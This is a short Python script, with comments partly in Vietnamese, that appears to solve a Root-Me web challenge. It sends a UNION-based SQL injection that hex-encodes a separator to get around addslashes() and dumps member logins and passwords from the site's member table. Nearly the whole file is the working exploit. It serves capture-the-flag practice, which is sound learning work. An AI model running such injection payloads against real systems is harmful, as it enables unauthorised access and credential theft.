import requests

url = 'http://challenge01.root-me.org/web-serveur/ch31/'

# select id,username,null,email from ? where id = 
# hex(sql đọc hiểu được hex_string, encode bypass addslash() tức thêm \ trước ',")
# path file index root-me: /challenge/web-serveur/ch31/index.php
enc = '0x' + ':'.encode('utf-8').hex()
payload = '2 union select 2,null,null,concat_ws(%s,member_login,member_password) from member' %(enc)
params_1 = {'action':'members','id':payload}

r = requests.get(url, params=params_1)

print(r.text)